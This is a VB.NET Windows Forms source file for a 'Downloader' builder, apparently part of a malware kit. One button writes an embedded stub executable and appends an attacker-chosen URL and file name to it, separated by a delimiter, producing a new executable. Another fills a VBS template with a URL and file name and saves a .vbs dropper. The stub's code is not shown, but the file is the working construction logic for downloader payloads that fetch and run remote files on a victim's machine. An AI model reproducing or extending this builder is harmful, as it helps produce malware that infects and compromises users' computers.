Public Class Downloader
    Dim stub, text1, text2 As String
    Const spl As String = "abccba" ' same in server if you wanna to change it  , we have to change it in server 
    Dim ex As Exception

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text & TextBox2.Text = "" Then
            MsgBox("Complete Information Please ", MsgBoxStyle.Critical, "Create downloader")
        Else
            Dim s As New SaveFileDialog
            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox3.Text

                Dim temp As String = IO.Path.GetTempPath() & "txhost.exe"
                'FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                IO.File.WriteAllBytes(temp, My.Resources.txhost)

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("URL : " & text1)
                ListBox1.Items.Add("File Name : " & text2)


                ListBox1.Items.Add("Server Build In : " & s.FileName)
            Else
                ListBox1.Items.Add(ex)
            End If
        End If
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label11.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label11.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label11.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region
    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        If TextBox3.Text & TextBox4.Text = "" Then
            MsgBox("Complete Information Please ", MsgBoxStyle.Critical, "Create downloader")

        Else
            Dim qouta = """"
            Dim url = qouta & TextBox2.Text & qouta
            Dim filename = qouta & TextBox4.Text & qouta

            Dim s As New SaveFileDialog



            Dim server As String
            server = My.Resources.vbsserver
            RichTextBox1.Text = server.Replace("%url%", url).Replace("%name%", filename)
            s.ShowDialog()
            RichTextBox1.SaveFile(s.FileName & ".vbs", RichTextBoxStreamType.PlainText)

        End If
    End Sub
    '652; 308
    Dim Currh As Double = 0.0
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If Currh < 307 Then
            Currh += 30.8
            Me.Size = New Size(Me.Width, Currh)

        Else
            Timer1.Stop()
        End If
    End Sub

    Private Sub Downloader_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Loading.downloaderFinished = False
        Timer1.Start()
    End Sub
End Class